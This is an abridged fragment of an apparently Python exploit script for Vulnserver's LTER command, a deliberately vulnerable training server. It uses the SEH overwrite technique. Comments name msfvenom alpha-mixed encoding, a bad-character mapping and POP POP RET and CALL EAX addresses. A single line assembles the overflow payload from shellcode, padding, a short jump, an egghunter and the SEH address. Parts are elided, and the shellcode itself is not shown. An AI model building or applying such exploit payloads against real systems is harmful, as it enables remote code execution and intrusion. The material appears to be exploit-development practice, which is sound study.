# Exploit for Vulnserver LTER - SEH way
...
# msfvenom -e x86/alpha_mixed BufferRegister=EAX
egghunter  = ""
...
# \xff -> \x80
# 0x6250172B - POP POP RET
# 0x62501084 - CALL EAX

payload = shellcode + "A"*(3515-len(shellcode)-len(egghunter)-7) + "\x4c"*4 + "\x58" + "\x2c\x76" + egghunter + "\x74\xff\x41\x41" + "\x2b\x17\x50\x62"
payload = payload + "D"*(4000-len(payload))
